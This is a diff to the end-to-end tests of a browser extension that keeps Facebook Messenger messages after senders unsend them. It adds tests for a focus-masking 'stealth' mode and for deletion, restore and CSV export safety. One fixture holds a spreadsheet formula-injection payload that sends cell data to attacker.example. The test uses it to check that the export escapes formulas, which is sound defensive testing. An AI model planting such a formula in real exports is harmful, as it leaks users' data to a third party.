@@ -92,14 +92,22 @@ test('Messenger Message Saver end to end', { timeout: 240000 }, async (t) => {
     assert.equal(await page.evaluate(() => typeof window.fb), 'object');
   });
 
-  await t.test('Unseen strong mode makes the page look backgrounded, and can be switched off', async () => {
-    await waitFor(async () => (await page.evaluate(() => fb.focusInfo())).visibilityState === 'hidden', { what: 'hidden' });
+  await t.test('Unseen strong mode reports "no focus" but keeps the real visibility', async () => {
+    await waitFor(async () => (await page.evaluate(() => fb.focusInfo())).hasFocus === false, { what: 'no focus' });
     const info = await page.evaluate(() => fb.focusInfo());
-    assert.deepEqual(info, { hasFocus: false, visibilityState: 'hidden', hidden: true });
-    await setSettings({ stealthFocus: false });
+    assert.equal(info.hasFocus, false);
+    assert.equal(info.visibilityState, 'visible', 'visibility is real by default (Facebook needs it)');
+    assert.equal(await page.evaluate(() => { let n = 0; window.addEventListener('focus', () => n++); window.dispatchEvent(new Event('focus')); return n; }), 0, 'window focus events held back');
+    // visibilitychange always reaches the page
+    assert.equal(await page.evaluate(() => { let n = 0; document.addEventListener('visibilitychange', () => n++); document.dispatchEvent(new Event('visibilitychange')); return n; }), 1);
+
+    await setSettings({ stealthVisibility: true });
+    await waitFor(async () => (await page.evaluate(() => fb.focusInfo())).visibilityState === 'hidden', { what: 'optional hidden mode' });
+    await setSettings({ stealthVisibility: false, stealthFocus: false });
     await waitFor(async () => (await page.evaluate(() => fb.focusInfo())).visibilityState === 'visible', { what: 'visible again' });
+    assert.equal(await page.evaluate(() => { let n = 0; window.addEventListener('focus', () => n++); window.dispatchEvent(new Event('focus')); return n; }), 1, 'focus events pass when Strong mode is off');
     await setSettings({ stealthFocus: true });
-    await waitFor(async () => (await page.evaluate(() => fb.focusInfo())).hidden === true, { what: 'hidden again' });
+    await waitFor(async () => (await page.evaluate(() => fb.focusInfo())).hasFocus === false, { what: 'no focus again' });
   });
 
   await t.test('network: message saved, then kept after the sender unsends it', async () => {
@@ -444,6 +452,54 @@ test('Messenger Message Saver end to end', { timeout: 240000 }, async (t) => {
     assert.ok(result.photos >= 4, 'photos exported: ' + result.photos);
     assert.deepEqual(result.once, result.before);
     assert.deepEqual(result.twice, result.before);
+  });
+
+  await t.test('data safety: shared photos survive deleting one chat; deletion is complete; CSV has no formulas; restore merges', async () => {
+    const r = await dash.evaluate(async () => {
+      const db = await import('/lib/db.js');
+      const blob = new Blob([new Uint8Array([1, 2, 3, 4])], { type: 'image/png' });
+      const msg = (key, threadKey, text, mediaKey) =>
+        db.finalizeMessage({ key, threadKey, text, ts: Date.now(), capturedAt: Date.now(), attachments: mediaKey ? [{ kind: 'screen-image', fbid: 'shared', mediaKey }] : [], history: [], sources: ['screen'], unsent: true, unsentAt: Date.now() });
+      await db.withStores(['messages', 'media', 'events', 'notifications', 'pendingMedia', 'threads'], 'readwrite', async (s) => {
+        s.media.put({ key: 'fbid:shared', blob, mime: 'image/png', size: 4, messageKey: 'dm:A1', savedAt: Date.now() });
+        s.messages.put(msg('dm:A1', 'chatA', 'secret in A', 'fbid:shared'));
+        s.messages.put(msg('dm:B1', 'chatB', '=HYPERLINK("https://attacker.example/?d="&A1,"Open")', 'fbid:shared'));
+        s.threads.put({ threadKey: 'chatA', domName: 'Chat A' });
+        s.events.add({ type: 'unsent', messageKey: 'dm:A1', threadKey: 'chatA', at: Date.now(), text: 'secret in A', recovered: true });
+        s.notifications.add({ title: 'Chat A', body: 'secret in A', ts: Date.now() });
+        s.pendingMedia.put({ id: 'dm:A1|x', messageKey: 'dm:A1', url: 'https://scontent.xx.fbcdn.net/x.jpg', fbid: 'x', addedAt: Date.now(), tries: 0 });
+      });
+      await db.deleteThread('chatA', { name: 'Chat A' });
+      const afterA = {
+        mediaStillThere: !!(await db.getMedia('fbid:shared')),
+        eventsWithA: (await db.getAll('events')).filter((e) => (e.text || '').includes('secret in A')).length,
+        notifWithA: (await db.getAll('notifications')).filter((n) => (n.body || '').includes('secret in A')).length,
+        pendingForA: (await db.getAll('pendingMedia')).filter((j) => j.messageKey === 'dm:A1').length,
+      };
+      // restoring the same backup twice must not duplicate anything
+      const { blob: backup } = await db.exportBlob({ includeMedia: true });
+      const file = new File([backup], 'b.json');
+      const n0 = (await db.getAll('notifications')).length;
+      const e0 = (await db.getAll('events')).length;
+      await db.importFile(file);
+      await db.importFile(file);
+      const dup = { notifications: (await db.getAll('notifications')).length - n0, events: (await db.getAll('events')).length - e0 };
+      await db.deleteThread('chatB', { name: '' });
+      return { afterA, dup, mediaAfterB: !!(await db.getMedia('fbid:shared')) };
+    });
+    assert.deepEqual(r.afterA, { mediaStillThere: true, eventsWithA: 0, notifWithA: 0, pendingForA: 0 });
+    assert.deepEqual(r.dup, { notifications: 0, events: 0 });
+    assert.equal(r.mediaAfterB, false, 'photo removed once no chat uses it');
+
+    // CSV: a message starting with "=" is written as text, not as a formula
+    await dash.evaluate(async () => {
+      const db = await import('/lib/db.js');
+      await db.withStores(['messages'], 'readwrite', async (s) => s.messages.put(db.finalizeMessage({ key: 'dm:F1', threadKey: 'chatF', text: '=1+1', ts: Date.now(), capturedAt: Date.now(), attachments: [], history: [], sources: ['screen'] })));
+    });
+    await dash.goto(`chrome-extension://${extId}/dashboard/dashboard.html#settings`);
+    const [download] = await Promise.all([dash.waitForEvent('download'), dash.click('#export-csv')]);
+    const csv = fs.readFileSync(await download.path(), 'utf8');
+    assert.ok(csv.includes("'=1+1"), 'formula neutralised: ' + csv.split('\n').find((l) => l.includes('1+1')));
   });
 
   await t.test('no script errors anywhere', async () => {
